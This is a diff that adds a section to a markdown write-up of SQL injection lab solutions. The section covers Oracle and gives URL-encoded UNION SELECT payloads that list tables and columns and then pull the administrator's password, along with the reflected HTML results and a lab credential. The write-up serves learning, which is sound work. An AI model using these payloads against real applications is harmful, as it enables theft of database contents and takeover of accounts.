@@ -89,3 +89,56 @@ The following payload solved this:
 `'+UNION+SELECT+username_kthzzr,+password_vxdqhk+FROM+users_rrudmq+--+`
 
 And with the details fetched, I logged into the account and solved the lab.
+
+---
+
+## 6. SQL injeciton attack, listing the database contents on Oracle databases
+<img src="./union-login-oracle.png" width=400>
+
+### Description
+Almost the same as [5.](#5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases), except the underlying database is Oracle.
+
+### Solution
+The only difference is the fact that the metadata for tables in Oracle DBs is stored in different tables. `ALL_TABLES` is where we can find table names, and `ALL_TAB_COLUMNS` is where we can find the column names for each table. I kept the whitespace after the comment marker `--` to reduce mental overhead.
+
+First, we use `UNION SELECT table_name, NULL FROM ALL_TABLES` to fetch all table names.
+The following payload fetches the names of all existing tables in the database:
+`'+UNION+SELECT+table_name,+NULL+FROM+ALL_TABLES+--+`
+
+The above results in the following table name being reflected in the HTML:
+`USERS_IDUFGY`
+
+Then, we need to find the column names of said table with `UNION SELECT column_name, NULL FROM ALL_TAB_COLUMNS WHERE table_name='USERS_IDUFGY'`
+
+This results in the following payload:
+`'+UNION+SELECT+column_name,+NULL+FROM+ALL_TAB_COLUMNS+WHERE+table_name%3d'USERS_IDUFGY'+--+`
+
+Which results in the following HTML fragments being reflected (reverted to using text for readability):
+```
+<tbody>
+    <tr>
+        <th>EMAIL</th>
+    </tr>
+    <tr>
+        <th>PASSWORD_BJMROB</th>
+    </tr>
+    <tr>
+        <th>USERNAME_POWVYJ</th>
+    </tr>
+</tbody>
+```
+
+And for the final (exfiltration) step, we need to find the login details of `administrator`. The SQL query for this would be `UNION SELECT USERNAME_POWVYJ, PASSWORD_BJMROB FROM USERS_IDUFGY WHERE USERNAME_POWVYJ='adminsitrator'`.
+
+This results in the following payload:
+`'+UNION+SELECT+USERNAME_POWVYJ,+PASSWORD_BJMROB+FROM+USERS_IDUFGY+WHERE+USERNAME_POWVYJ%3d'administrator'+--+`
+
+Which, finally, gives us our holy grail:
+```
+<tr>
+    <th>administrator</th>
+    <td>efdrsun95to7myrsiwr1</td>
+</tr>
+```
+
+With that, I logged into the administrator account, and the lab was solved. Not a single internal server error this time!
